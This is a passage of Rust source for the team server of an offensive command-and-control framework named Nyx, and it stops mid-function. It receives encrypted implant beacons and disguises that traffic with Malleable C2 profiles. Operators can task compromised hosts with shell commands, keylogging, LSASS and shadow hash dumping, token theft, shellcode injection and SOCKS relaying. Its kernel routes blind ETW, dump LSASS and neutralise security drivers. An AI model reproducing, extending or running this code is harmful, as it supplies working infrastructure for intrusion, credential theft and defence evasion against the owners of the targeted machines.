//! Nyx team server (HTTP, P0).
//!
//! Routes:
//! - `POST /beacon`            — implant traffic (encrypted frame); returns queued tasks.
//! - `GET  /api/sessions`      — list registered sessions (JSON).
//! - `POST /api/task`          — queue a task for a session (JSON).
//! - `GET  /api/results`       — drain task results for a session (JSON).

pub mod audit;
pub mod operators;
pub mod tls;
pub mod kernel;

use std::sync::Arc;
use std::time::{Instant, SystemTime, UNIX_EPOCH};

/// Maximum queued-but-undelivered tasks per session. An authenticated operator
/// (or a compromised token) can otherwise enqueue unbounded tasks → OOM. Past
/// this the enqueue is rejected with 503 (back-pressure), not silently dropped.
pub const MAX_PENDING_PER_SESSION: usize = 1024;
/// Maximum undelivered result entries per session. A rogue/compromised implant
/// streaming Output/FileChunk blobs could otherwise fill RAM forever; past this
/// the oldest entries are evicted (results are best-effort — operators drain
/// them, and an unattended server shouldn't OOM on a chatty beacon).
pub const MAX_RESULTS_PER_SESSION: usize = 4096;
/// Maximum concurrent sessions. Beacon check-in is unauthenticated (anyone who
/// speaks the protocol registers a session), so without a cap an attacker can
/// flood the registry with distinct ephemeral keys → OOM.
pub const MAX_SESSIONS: usize = 4096;
/// Per-request body cap on the beacon endpoint (and any profile-declared beacon
/// URIs). A beacon body is exactly ONE encrypted frame — `[32 pubkey][8 counter]
/// [4 ct_len][ct ≤ 256 KiB (the protocol's MAX_CT_LEN)][16 tag]` — so the real
/// ceiling is ~256 KiB + header. 512 KiB is generous while staying ~8× under the
/// 4 MiB cap on the operator API routes, so an unauthenticated flood against
/// `/beacon` (check-in is crypto-gated, not token-gated, by design) can't buffer
/// the full API allowance per hit.
pub const BEACON_BODY_LIMIT: usize = 512 * 1024;

use axum::{
    body::Bytes,
    extract::{ConnectInfo, DefaultBodyLimit, Query, State},
    http::{HeaderMap, Method, StatusCode},
    response::{IntoResponse, Response},
    routing::{get, post},
    Json, Router,
};
use dashmap::DashMap;
use nyx_protocol::{
    encode_frame_dir, open_frame, parse_frame, wire::Reader, Command, Direction, FileOp,
    Response as MsgResponse, ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
};
use serde::{Deserialize, Serialize};

/// A session is keyed by the implant's 32-byte ephemeral public key.
pub type SessionId = [u8; 32];

pub struct Session {
    pub key: SessionKey,
    pub info: SessionInfo,
    pub last_recv: u64,
    pub send_counter: u64,
    pub next_task_id: u64,
    pub pending: Vec<Task>,
    pub results: Vec<TaskResponse>,
    pub created: Instant,
    /// Inbound TLS JA3 (MD5, 32 hex) of the connecting beacon, if captured by
    /// the ClientHello sniffer. `None` on plaintext or when sniff failed.
    pub ja3: Option<String>,
    /// Inbound TLS JA4 (FoxIO `a_b_c`), if captured.
    pub ja4: Option<String>,
}

pub struct AppState {
    pub keypair: ServerKeypair,
    pub sessions: DashMap<SessionId, Session>,
    /// Active Malleable C2 profile (loaded from `NYX_PROFILE`). When present,
    /// the beacon handler is also served at the profile's transaction URIs.
    pub profile: Option<nyx_profile::Profile>,
    /// If set, control-API requests (`/api/*`) must carry
    /// `Authorization: Bearer <api_token>`. Beacon traffic is exempt (implants
    /// authenticate cryptographically, not with a shared token).
    pub api_token: Option<String>,
    /// Optional kill date (Unix seconds). Checked at boot AND on every beacon:
    /// once the current time passes it, the server stops serving beacons.
    pub killdate: Option<u64>,
    /// Scripting event bus. Hooks are registered at construction; the beacon
    /// handler fires `SessionNew` / `ResultReceived` events into it.
    pub events: nyx_scripting::EventBus,
    /// Inbound TLS fingerprints keyed by peer socket address, populated by the
    /// ClientHello sniffer on the TLS path. The beacon handler pops the entry
    /// for its peer on check-in and stamps it onto the new session. Plaintext
    /// (dev) connections never populate this (no ClientHello to sniff).
    pub fingerprints: DashMap<std::net::SocketAddr, Fingerprint>,
    /// Persistent credential store (SQLite, WAL). Survives a team-server
    /// restart — UNLIKE sessions (which are in-memory). Shared across operators:
    /// a cred POSTed by one is visible to all via `GET /api/creds`.
    pub creds: Arc<nyx_store::CredStore>,
    /// Named-operator registry (Phase 3). Empty = open mode; non-empty gates
    /// `/api/*` by per-operator `name:secret` (or the `_legacy` NYX_TOKEN).
    pub operators: Arc<operators::OperatorRegistry>,
    /// Action audit log (Phase 3). `None` in tests/`AppState::default()`;
    /// `Some` when the server boots with a log path.
    pub audit: Option<Arc<audit::AuditWriter>>,
    /// Kernel daemon bridge (P6). `None` when no daemon configured.
    pub kernel: Option<Arc<kernel::KernelBridge>>,
}


/// A captured inbound TLS fingerprint (JA3 + JA4), keyed by peer addr.
#[derive(Debug, Clone, Default)]
pub struct Fingerprint {
    pub ja3: Option<String>,
    pub ja4: Option<String>,
}

impl AppState {
    /// Register the server's built-in scripting hooks (currently a hook that
    /// mirrors events into the tracing log). Call once, before sharing.
    pub fn register_default_hooks(&mut self) {
        self.events.register(Box::new(TracingEventHook));
    }
}

impl Default for AppState {
    fn default() -> Self {
        Self {
            keypair: ServerKeypair::generate(),
            sessions: DashMap::new(),
            profile: None,
            api_token: None,
            killdate: None,
            events: nyx_scripting::EventBus::new(),
            fingerprints: DashMap::new(),
            creds: Arc::new(nyx_store::CredStore::open_in_memory().expect("in-memory cred store")),
            operators: Arc::new(operators::OperatorRegistry::empty()),
            audit: None,
            kernel: None,
        }
    }
}

/// Bridge scripting events into the server's `tracing` log (the default hook).
struct TracingEventHook;

impl nyx_scripting::Hook for TracingEventHook {
    fn name(&self) -> &str {
        "tracing"
    }
    fn on_event(&self, event: &nyx_scripting::Event) {
        match event {
            nyx_scripting::Event::SessionNew(s) => tracing::info!(
                target: "nyx::scripting",
                session = %s.session_id,
                user = %s.username,
                host = %s.hostname,
                "scripting: session_new"
            ),
            nyx_scripting::Event::ResultReceived(r) => tracing::debug!(
                target: "nyx::scripting",
                session = %r.session_id,
                task = r.task_id,
                "scripting: result"
            ),
            nyx_scripting::Event::SessionExit(s) => tracing::info!(
                target: "nyx::scripting",
                session = %s.session_id,
                "scripting: session_exit"
            ),
        }
    }
}

/// Map a wire [`MsgResponse`] to a scripting event's kind + short summary.
fn response_event_kind(r: &MsgResponse) -> (nyx_scripting::ResultKind, String) {
    match r {
        MsgResponse::Output(b) => (
            nyx_scripting::ResultKind::Output,
            String::from_utf8_lossy(b).chars().take(64).collect(),
        ),
        MsgResponse::Ok => (nyx_scripting::ResultKind::Ok, String::new()),
        MsgResponse::Err(m) => (nyx_scripting::ResultKind::Err, m.clone()),
        MsgResponse::FileChunk { name, .. } => (
            nyx_scripting::ResultKind::FileChunk,
            format!("<chunk {name}>"),
        ),
        MsgResponse::BofOutput(b) => (
            nyx_scripting::ResultKind::Other,
            String::from_utf8_lossy(b).chars().take(64).collect(),
        ),
        MsgResponse::Channel { chan, .. } => {
            (nyx_scripting::ResultKind::Other, format!("<chan {chan}>"))
        }
        MsgResponse::Image(d) => (
            nyx_scripting::ResultKind::Other,
            format!("<screenshot {} bytes>", d.len()),
        ),
    }
}

/// Load + lint a Malleable C2 profile from disk. Returns the parsed profile, or
/// an error if the file can't be read, fails to parse, or has `c2lint` errors.
pub fn load_profile(path: &std::path::Path) -> anyhow::Result<nyx_profile::Profile> {
    let src = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("read profile {}: {e}", path.display()))?;
    let profile = nyx_profile::parse(&src).map_err(|e| anyhow::anyhow!("parse profile: {e}"))?;
    let errors: Vec<_> = nyx_profile::lint(&profile)
        .into_iter()
        .filter(|d| d.severity == nyx_profile::Severity::Error)
        .collect();
    if errors.is_empty() {
        Ok(profile)
    } else {
        let msgs: Vec<_> = errors
            .iter()
            .map(|d| format!("  line {}: {}", d.line, d.message))
            .collect();
        anyhow::bail!(
            "profile {} has {} lint error(s):\n{}",
            path.display(),
            errors.len(),
            msgs.join("\n")
        )
    }
}

/// Load the server's long-term keypair from `path`, or generate + persist it
/// (0600 on Unix) if absent. With `NYX_KEYFILE` set, sessions survive a server
/// restart instead of getting a fresh identity each boot.
pub fn load_or_create_keypair(
    path: &std::path::Path,
) -> anyhow::Result<nyx_protocol::ServerKeypair> {
    use nyx_protocol::ServerKeypair;
    if path.exists() {
        let bytes = std::fs::read(path)?;
        let arr: [u8; 32] = bytes
            .as_slice()
            .try_into()
            .map_err(|_| anyhow::anyhow!("keyfile {} is not 32 bytes", path.display()))?;
        Ok(ServerKeypair::from_secret_bytes(arr))
    } else {
        let kp = ServerKeypair::generate();
        std::fs::write(path, kp.to_secret_bytes())?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600));
        }
        Ok(kp)
    }
}

/// Load + compile a Rhai operator script (`NYX_SCRIPT`) into a hook. Errors if
/// the file can't be read or has a syntax error.
pub fn load_script(path: &std::path::Path) -> anyhow::Result<nyx_scripting_rhai::RhaiHook> {
    let src = std::fs::read_to_string(path)
        .map_err(|e| anyhow::anyhow!("read script {}: {e}", path.display()))?;
    nyx_scripting_rhai::RhaiHook::new(&path.display().to_string(), &src)
        .map_err(|e| anyhow::anyhow!("compile script {}: {e}", path.display()))
}

pub fn router(state: Arc<AppState>) -> Router {
    // Collect any profile-declared beacon URIs + their `set verb` before `state`
    // moves into the router. The beacon handler is URI-agnostic (it just
    // decrypts the body), so serving it at the profile's transaction URIs makes
    // the beacon path malleable — the most fingerprinted C2 indicator — without
    // touching crypto. We honour `set verb` (GET/POST) so the registered method
    // matches what the profile says the beacon will use.
    let extra: Vec<(String, bool)> = state
        .profile
        .as_ref()
        .map(|p| {
            // (uri, is_post). Each transaction block's verb defaults to its name
            // (http-get → GET, http-post → POST) unless overridden by `set verb`.
            let mut out: Vec<(String, bool)> = Vec::new();
            for (txn, default_post) in [("http-post", true), ("http-get", false)] {
                for b in p.blocks(txn) {
                    let Some(uri) = b.get("uri").map(|u| u.as_str().into_owned()) else {
                        continue;
                    };
                    let verb = b.get("verb").map(|v| v.as_str().to_ascii_uppercase());
                    let is_post = match verb.as_deref() {
                        Some("POST") => true,
                        Some("GET") => false,
                        _ => default_post,
                    };
                    out.push((uri, is_post));
                }
            }
            out
        })
        .unwrap_or_default();

    // Beacon routes (unauthenticated, crypto-gated). A beacon POST carries
    // exactly ONE encrypted frame (≤ ~256 KiB: MAX_CT_LEN + header + tag), so
    // BEACON_BODY_LIMIT (512 KiB) is generous. Keeping it well under the API
    // limit bounds the pre-auth buffering an attacker can trigger per /beacon
    // connection (check-in is crypto-gated, not token-gated, by design).
    let mut beacon_routes = Router::new().route("/beacon", post(beacon));
    let mut seen = std::collections::HashSet::new();
    for (uri, is_post) in extra {
        if uri.is_empty() || uri == "/beacon" || !seen.insert(uri.clone()) {
            continue;
        }
        beacon_routes = if is_post {
            beacon_routes.route(&uri, post(beacon))
        } else {
            beacon_routes.route(&uri, get(beacon))
        };
    }
    let beacon_routes = beacon_routes.route_layer(DefaultBodyLimit::max(BEACON_BODY_LIMIT));

    // Control-API routes (operator; token-gated when NYX_TOKEN is set). A larger
    // cap so hex-encoded Upload/Bof payloads fit (a 2 MB file → ~4 MB of hex in
    // the JSON body). This layer covers BOTH serving paths — `axum::serve`
    // (plaintext) and the raw-TLS `serve_connection` in main.rs (no built-in
    // limit) — because the layer is baked into the Router's service whichever
    // driver consumes it.
    let api_routes = Router::new()
        .route("/api/sessions", get(list_sessions))
        .route("/api/task", post(post_task))
        .route("/api/tasks", get(get_tasks))
        .route("/api/results", get(get_results))
        .route("/api/profile", get(get_profile))
        .route("/api/creds", get(list_creds).post(post_creds))
        .route("/api/creds/delete", post(delete_cred))
        .route("/api/audit", get(get_audit))
        .route("/api/audit/verify", get(verify_audit))
        // Kernel daemon bridge routes (P6).
        .route("/api/kernel/status", get(kernel::driver_status))
        .route("/api/kernel/blind-etw", post(kernel::blind_etw))
        .route("/api/kernel/hide", post(kernel::hide))
        .route("/api/kernel/dump-lsass", post(kernel::dump_lsass))
        .route("/api/kernel/neutralize", post(kernel::neutralize))
        .route("/api/kernel/detach-minifilter", post(kernel::detach_minifilter))
        .layer(DefaultBodyLimit::max(4 * 1024 * 1024));

    beacon_routes.merge(api_routes).with_state(state)
}

// ---- implant endpoint ------------------------------------------------------

async fn beacon(
    State(st): State<Arc<AppState>>,
    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
    method: Method,
    headers: HeaderMap,
    body: Bytes,
) -> Response {
    match handle_beacon(&st, &peer, &method, &headers, &body) {
        Ok(frame) => shape_beacon_response(&st, frame),
        Err(e) => {
            tracing::warn!(error = %e, "beacon handler error");
            StatusCode::BAD_REQUEST.into_response()
        }
    }
}

/// Apply the Malleable C2 profile's server-side envelope to the encrypted
/// frame the beacon handler produced. With no profile (or a profile whose
/// `http-post` has no `server { output { } }` block), the envelope is a no-op
/// and the raw frame is returned as before — so this is strictly opt-in.
///
/// The `http-post` transaction is the beacon's task-delivery channel, so its
/// `server.output` transform chain + `header` statements shape the response.
/// Transforming the body makes beacon traffic match the transaction the profile
/// describes (e.g. base64+prepend so the body looks like a JSON field) instead
/// of leaking a raw encrypted frame.
fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
    let Some(profile) = &st.profile else {
        return (StatusCode::OK, body_bytes(frame)).into_response();
    };
    let env = nyx_profile::post_server_envelope(profile);
    if env.terminator.is_none() && env.steps.is_empty() && env.headers.is_empty() {
        // No envelope declared — raw frame, legacy behaviour.
        return (StatusCode::OK, body_bytes(frame)).into_response();
    }
    let (body, extra) = env.shape_body(&frame);

    let mut resp = (StatusCode::OK, body_bytes(body)).into_response();

    // Apply profile-declared response headers. CS `header "N" "V"` sets static
    // pairs; when the terminator is a header, the transformed bytes go there too.
    use axum::http::HeaderValue;
    for (name, val) in &env.headers {
        if let (Ok(n), Ok(v)) = (
            axum::http::HeaderName::from_bytes(name),
            HeaderValue::from_bytes(val),
        ) {
            resp.headers_mut().insert(n, v);
        }
    }
    // If the output terminator is a named header, inject the transformed frame
    // bytes there (overriding any static value for that name). For a Parameter
    // terminator the bytes can't ride in a query string on a *response* (the
    // server doesn't control the beacon's request URL), so they go in the body
    // — the agent inverts them from the body. uri-append is request-side only
    // (the beacon appends to its own URL), so on the response path it falls back
    // to the body as well.
    match &env.terminator {
        Some(nyx_profile::Terminator::Header(h)) => {
            if let (Ok(n), Ok(v)) = (
                axum::http::HeaderName::from_bytes(h.as_bytes()),
                HeaderValue::from_bytes(&extra),
            ) {
                resp.headers_mut().insert(n, v);
            } else {
                // The transform output isn't valid header bytes (non-ASCII after
                // a non-base64 chain like mask). Log so the operator sees the
                // profile/transform incompatibility instead of silent frame loss.
                tracing::warn!(
                    header = %h,
                    "profile output terminator 'header' produced non-ASCII bytes \
                     (need base64/hex in the transform chain); response body empty"
                );
            }
        }
        Some(nyx_profile::Terminator::Parameter(_)) | Some(nyx_profile::Terminator::UriAppend) => {
            // The transformed bytes belong in the body for the response path.
            #[allow(clippy::collapsible_match)]
            if !extra.is_empty() {
                resp = (StatusCode::OK, body_bytes(extra)).into_response();
                // Re-apply static headers (the body swap dropped them).
                use axum::http::HeaderValue;
                for (name, val) in &env.headers {
                    if let (Ok(n), Ok(v)) = (
                        axum::http::HeaderName::from_bytes(name),
                        HeaderValue::from_bytes(val),
                    ) {
                        resp.headers_mut().insert(n, v);
                    }
                }
            }
        }
        _ => {}
    }
    resp
}

/// Wrap a Vec<u8> as an axum response body.
fn body_bytes(b: Vec<u8>) -> axum::body::Body {
    axum::body::Body::from(b)
}

/// Constant-time byte comparison to avoid timing oracles on secrets.
/// Constant-time byte comparison that does NOT short-circuit on length.
///
/// A naive `if a.len() != b.len() { return false }` leaks the expected
/// (secret) length as a timing distinguisher — for an operator API token that
/// gates tasking on every beacon, that's a real side channel. Instead we scan
/// every byte of the shorter input and fold a length-mismatch flag into the
/// same accumulator, so the work depends only on `min(a.len(), b.len())` and
/// never on where (or whether) the buffers first differ.
pub(crate) fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    use sha2::{Digest, Sha256};

    let mut ha = Sha256::new();
    ha.update(a);
    let digest_a = ha.finalize();

    let mut hb = Sha256::new();
    hb.update(b);
    let digest_b = hb.finalize();

    let mut diff = 0;
    for (x, y) in digest_a.iter().zip(digest_b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

fn handle_beacon(
    st: &AppState,
    peer: &std::net::SocketAddr,
    method: &Method,
    headers: &HeaderMap,
    body: &[u8],
) -> anyhow::Result<Vec<u8>> {
    // Kill date: once reached, refuse all beacon traffic so a burned server goes
    // dark (checked per-request, not just at boot, so a long-running server
    // honors it too). Fail CLOSED on a clock error: `unwrap_or(0)` would treat
    // a pre-epoch / skewed clock as now=0, silently *disabling* the kill date
    // (0 < kd always passes) — the opposite of safe for a burn-the-server guard.
    if let Some(kd) = st.killdate {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .map_err(|_| {
                anyhow::anyhow!("clock before UNIX_EPOCH; kill-date check cannot run safely")
            })?;
        if now >= kd {
            anyhow::bail!("kill date {kd} reached; refusing beacon");
        }
    }
    // Invert the profile's client-side request envelope (if any) before parsing.
    // No profile, or a client block with no transform chain → the body IS the raw
    // frame (identity, zero extra work: parse_frame runs on `body` directly). A
    // transform chain (base64/mask/...) → pull the transformed bytes from the body
    // (print/uri-append/none) or the terminator header, then decode.
    let raw = if let Some(profile) = &st.profile {
        let env = if *method == Method::POST {
            nyx_profile::post_client_envelope(profile)
        } else {
            nyx_profile::get_client_envelope(profile)
        };
        if env.is_noop() {
            // No client block declared → the body IS the raw frame. `is_noop()`
            // is the single source of truth for "nothing to do", so a step-free
            // header/parameter terminator CANNOT accidentally take this fast
            // path and skip locating its bytes (the bug where
            // `client { output { header "Cookie"; } }` dropped every check-in).
            parse_frame(body)?
        } else {
            // Locate the on-wire bytes per the terminator (body for print/none/
            // uri-append, the named header for a header terminator), then invert
            // the transform chain if any.
            let on_wire: &[u8] = match &env.terminator {
                Some(nyx_profile::Terminator::Header(h)) => headers
                    .get(h.as_str())
                    .map(|hv| hv.as_bytes())
                    .ok_or_else(|| {
                        anyhow::anyhow!("client envelope expects request header `{h}`")
                    })?,
                Some(nyx_profile::Terminator::Parameter(p)) => anyhow::bail!(
                    "client envelope parameter terminator `{p}` unsupported on the beacon path"
                ),
                _ => body,
            };
            if env.steps.is_empty() {
                parse_frame(on_wire)?
            } else {
                let decoded = nyx_profile::decode(&env.steps, on_wire)
                    .map_err(|e| anyhow::anyhow!("client envelope decode failed: {e}"))?;
                parse_frame(&decoded)?
            }
        }
    } else {
        parse_frame(body)?
    };

    // Decide new-vs-existing and (for existing) grab the session key. This
    // read-guard counter check is ADVISORY only: it lets us skip the decrypt
    // for an obvious stale replay, but it is NOT the authoritative anti-replay
    // decision — that lives inside the write guard below (existing-session
    // branch), where the check and the `last_recv` commit are atomic. Without
    // that, two concurrent beacons carrying the same counter could both pass
    // this read-guard check before either commits, defeating replay protection.
    // (The server runs under `panic = "abort"`, so we must never panic on a
    // missing/raced session entry — hence the clean error paths, no `.expect()`.)
    let (is_new, key) = match st.sessions.get(&raw.pubkey) {
        None => (true, st.keypair.derive_for(&raw.pubkey)),
        Some(s) => {
            if raw.counter <= s.last_recv {
                anyhow::bail!("replayed/stale counter {}", raw.counter);
            }
            (false, s.key)
        }
    };

    let plaintext =
        open_frame(&key, &raw).map_err(|_| anyhow::anyhow!("frame decryption failed"))?;

    if is_new {
        // First message from an implant is always its SessionInfo (check-in).
        // Cap the global session count: beacon check-in is unauthenticated
        // (anyone who speaks the protocol registers), so without a cap an
        // attacker flooding distinct ephemeral keys OOMs the registry.
        if st.sessions.len() >= MAX_SESSIONS {
            anyhow::bail!("session registry full ({MAX_SESSIONS}); refusing new check-in");
        }
        let mut r = Reader::new(&plaintext);
        let info = SessionInfo::decode(&mut r)?;
        tracing::info!(
            beacon_id = info.beacon_id,
            host = %info.hostname,
            user = %info.username,
            os = %info.os,
            "new session registered"
        );
        let new_event = nyx_scripting::Event::SessionNew(nyx_scripting::SessionNew {
            session_id: hex::encode(raw.pubkey),
            hostname: info.hostname.clone(),
            username: info.username.clone(),
            os: info.os.clone(),
            is_admin: info.is_admin == 1,
        });
        // Pop the inbound TLS fingerprint the sniffer captured for this peer
        // (TLS path). On plaintext (dev) or when sniff failed, both stay None.
        let fp = st
            .fingerprints
            .remove(peer)
            .map(|(_, v)| v)
            .unwrap_or_default();
        let session = Session {
            key,
            info,
            last_recv: raw.counter,
            send_counter: 0,
            next_task_id: 1,
            pending: Vec::new(),
            results: Vec::new(),
            created: Instant::now(),
            ja3: fp.ja3,
            ja4: fp.ja4,
        };
        st.sessions.insert(raw.pubkey, session);
        st.events.fire(&new_event);
        // No tasks queued yet — reply with an empty batch.
        // Reply sealed in the server→implant nonce space (Direction::ServerToClient)
        // so it never collides with the implant's own Tx nonces under the shared key.
        Ok(encode_frame_dir(
            &raw.pubkey,
            Direction::ServerToClient,
            0,
            &key,
            &Task::encode_vec(&[])?,
        ))
    } else {
        // Subsequent messages carry task responses; we reply with queued tasks.
        //
        // AUTHORITATIVE anti-replay check — INSIDE the write guard. The advisory
        // read-guard check above only saves a decrypt on an obvious stale frame;
        // THIS is where replay protection is actually enforced, because the
        // `counter <= last_recv` test and the `last_recv = counter` commit run
        // under one `get_mut` guard and so cannot be split by a concurrent beacon
        // for the same session. A racing replay that also passed the advisory
        // check loses here: whichever request takes the write guard first
        // advances `last_recv`; the other then sees `counter <= last_recv` and is
        // rejected. (If the session vanished between the get() above and here,
        // return a clean error — never panic.)
        let mut s = st
            .sessions
            .get_mut(&raw.pubkey)
            .ok_or_else(|| anyhow::anyhow!("session vanished mid-request"))?;
        if raw.counter <= s.last_recv {
            anyhow::bail!("replayed/stale counter {}", raw.counter);
        }
        s.last_recv = raw.counter;
        let responses = TaskResponse::decode_vec(&plaintext)?;
        // Snapshot the scripting-event payloads now (we're about to move
        // `responses` into s.results), then fire them AFTER dropping the guard
        // so a slow operator script (NYX_SCRIPT) can't block this session's
        // DashMap shard.
        let session_id = hex::encode(raw.pubkey);
        let fired: Vec<nyx_scripting::Event> = responses
            .iter()
            .map(|r| {
                let (kind, summary) = response_event_kind(&r.response);
                nyx_scripting::Event::ResultReceived(nyx_scripting::ResultReceived {
                    session_id: session_id.clone(),
                    task_id: r.task_id,
                    kind,
                    summary,
                })
            })
            .collect();
        for r in responses {
            s.results.push(r);
            // Bound the results buffer: a rogue/compromised implant streaming
            // Output/FileChunk blobs could otherwise fill RAM forever. Evict
            // oldest (results are best-effort; operators drain them, and an
            // unattended server mustn't OOM on a chatty beacon).
            if s.results.len() > MAX_RESULTS_PER_SESSION {
                let drop_n = s.results.len() - MAX_RESULTS_PER_SESSION;
                s.results.drain(0..drop_n);
            }
        }
        let tasks = std::mem::take(&mut s.pending);
        s.send_counter += 1;
        let counter = s.send_counter;
        drop(s);
        for ev in fired {
            st.events.fire(&ev);
        }
        let reply = Task::encode_vec(&tasks)?;
        Ok(encode_frame_dir(
            &raw.pubkey,
            Direction::ServerToClient,
            counter,
            &key,
            &reply,
        ))
    }
}

// ---- control API -----------------------------------------------------------

#[derive(Serialize)]
struct SessionView {
    id: String,
    beacon_id: u32,
    hostname: String,
    username: String,
    os: String,
    arch: u8,
    pid: u32,
    is_admin: u8,
    pending: usize,
    age_secs: u64,
    /// Inbound TLS JA3 (if captured by the ClientHello sniffer).
    #[serde(skip_serializing_if = "Option::is_none")]
    ja3: Option<String>,
    /// Inbound TLS JA4 (if captured).
    #[serde(skip_serializing_if = "Option::is_none")]
    ja4: Option<String>,
}

/// If an API token is configured, every control-API request must carry
/// `Authorization: Bearer <token>`. `/beacon` is exempt (implants authenticate
/// cryptographically). Returns `Ok(())` when allowed, else a 401 `Response`.
///
/// Comparison is constant-time to avoid a timing oracle on the operator token
/// (the API token gates tasking on every active beacon — a side-channel leak is
/// a serious operational risk).
fn require_auth(st: &AppState, headers: &HeaderMap) -> Option<Response> {
    // Delegates to `authenticate` so the named-operator registry (Phase 3) gates
    // the read-only handlers identically to the write handlers. `authenticate`
    // encodes the full precedence: registry → legacy token → open.
    match authenticate(st, headers) {
        AuthOutcome::Allowed(_) => None,
        AuthOutcome::Denied(r) => Some(r),
    }
}

/// Phase 3 auth outcome: either a resolved operator identity or a 401 response.
enum AuthOutcome {
    Allowed(operators::OperatorIdentity),
    Denied(Response),
}

/// Resolve a request to a named operator identity (Phase 3). Precedence:
/// (1) a non-empty operator registry → `name:secret` (or bare token → `_legacy`);
/// (2) else the legacy shared `NYX_TOKEN` (constant-time, identity `_legacy`);
/// (3) else open mode (identity `_anonymous`). `require_auth` is retained for
/// the read-only handlers that don't need attribution in v1.
fn authenticate(st: &AppState, headers: &HeaderMap) -> AuthOutcome {
    let bearer_val = headers
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|h| h.to_str().ok())
        .map(|s| s.to_string());
    // (1) Multi-operator registry (loaded from NYX_OPERATORS_FILE / bootstrapped).
    if !st.operators.is_open() {
        let bearer = bearer_val
            .as_deref()
            .and_then(|s| s.strip_prefix("Bearer "));
        return match bearer {
            Some(b) => match st.operators.resolve(b) {
                Some(op) => AuthOutcome::Allowed(op),
                None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
            },
            None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
        };
    }
    // (2) Legacy single shared token.
    if let Some(expected) = &st.api_token {
        let want = format!("Bearer {expected}");
        let presented = bearer_val.as_deref().unwrap_or("");
        if constant_time_eq(want.as_bytes(), presented.as_bytes()) {
            return AuthOutcome::Allowed(operators::OperatorIdentity {
                name: "_legacy".into(),
                role: operators::Role::Admin,
            });
        }
        return AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response());
    }
    // (3) Open (dev/CI).
    AuthOutcome::Allowed(operators::OperatorIdentity {
        name: "_anonymous".into(),
        role: operators::Role::Admin,
    })
}

async fn list_sessions(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    // Optimization: pre-allocate capacity to prevent reallocation during DashMap iteration.
    let mut out = Vec::with_capacity(st.sessions.len());
    for entry in st.sessions.iter() {
        out.push(SessionView {
            id: hex::encode(entry.key()),
            beacon_id: entry.info.beacon_id,
            hostname: entry.info.hostname.clone(),
            username: entry.info.username.clone(),
            os: entry.info.os.clone(),
            arch: entry.info.arch,
            pid: entry.info.pid,
            is_admin: entry.info.is_admin,
            pending: entry.pending.len(),
            age_secs: entry.created.elapsed().as_secs(),
            ja3: entry.ja3.clone(),
            ja4: entry.ja4.clone(),
        });
    }
    Json(out).into_response()
}

#[derive(Deserialize)]
struct TaskReq {
    session: String,
    command: JsonCommand,
}

#[derive(Deserialize)]
#[serde(tag = "type", rename_all = "lowercase")]
enum JsonCommand {
    Ping,
    Shell {
        args: String,
    },
    Sleep {
        seconds: u32,
        jitter_pct: u8,
    },
    /// Write `data_hex` (hex-encoded bytes) to a file named `name` on the target.
    Upload {
        name: String,
        data_hex: String,
    },
    /// Read `path` off the target (streamed back as `FileChunk`s).
    Download {
        path: String,
    },
    /// Execute a BOF/COFF object: `name` (entry label), `args`, `data_hex`
    /// (hex-encoded COFF bytes). Output streams back as a `BofOutput` result.
    Bof {
        name: String,
        args: Vec<String>,
        data_hex: String,
    },
    /// 文件系统操作：op ∈ {cd,mkdir,rm,mv,cp}，dest 仅 mv/cp 需要。
    FileOp {
        op: String,
        path: String,
        dest: Option<String>,
    },
    /// 打开出站连接（P2P / rportfwd）。chan 由 server 分配。
    Connect {
        host: String,
        port: u16,
    },
    /// SOCKS5 中继控制。
    Socks {
        chan: u32,
        op: u8,
        addr: String,
        port: u16,
    },
    /// 截屏。monitor 0=主屏。
    Screenshot {
        monitor: u8,
    },
    /// 端口扫描。
    Portscan {
        host: String,
        ports: String,
    },
    /// 网络信息收集。
    Net {
        query: String,
    },
    /// 磁盘信息。
    Driveinfo,
    /// 剪贴板。
    Clipboard,
    /// 环境变量。name 空串=全部。
    Env {
        name: String,
    },
    /// 键盘记录。action 0=start 1=stop 2=dump。
    Keylog {
        action: u8,
    },
    /// 持续截屏。
    Screenwatch {
        interval_secs: u32,
    },
    /// 凭据哈希提取。method 0=LSASS 1=shadow。
    Hashdump {
        method: u8,
    },
    /// 中继通道写数据（operator→implant 方向）。data_hex 为 hex 编码字节。
    ChannelData {
        chan: u32,
        data_hex: String,
    },
    /// 关闭中继通道（显式拆除；implant 也会在 socket EOF 时自动关）。
    ChannelClose {
        chan: u32,
    },
    /// 令牌窃取：复制 `pid` 的主令牌供后续冒用。横向移动原语。
    StealToken {
        pid: u32,
    },
    /// 造令牌（make-token / pass-the-password）：`domain\user` + `password`。
    /// `logon_type` 1=interactive(默认) 2=network 3=new-credentials。
    MakeToken {
        domain: String,
        user: String,
        password: String,
        logon_type: u8,
    },
    /// 丢弃当前线程冒用（RevertToSelf），但保留持有的令牌供复用。
    Rev2Self,
    /// 查询当前线程身份（DOMAIN\user + 是否持有令牌）。
    GetUid,
    /// 注入 shellcode 到目标进程。method=0 Pool Party(暂走 stomp)/1 threadless/2 stomp。
    Inject {
        method: u8,
        pid: u32,
        spawn_to: String,
        sc_hex: String,
    },
    Exit,
}

/// Connect channel id 分配器（模块级原子计数器）。
static CHAN_SEQ: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(1);
fn next_chan() -> u32 {
    CHAN_SEQ.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

impl JsonCommand {
    /// Convert to a wire [`Command`]. `Upload` decodes its hex payload here; a
    /// malformed hex string is surfaced as an error for a 400 response.
    fn into_command(self) -> Result<Command, &'static str> {
        Ok(match self {
            JsonCommand::Ping => Command::Ping,
            JsonCommand::Shell { args } => Command::Shell { args },
            JsonCommand::Sleep {
                seconds,
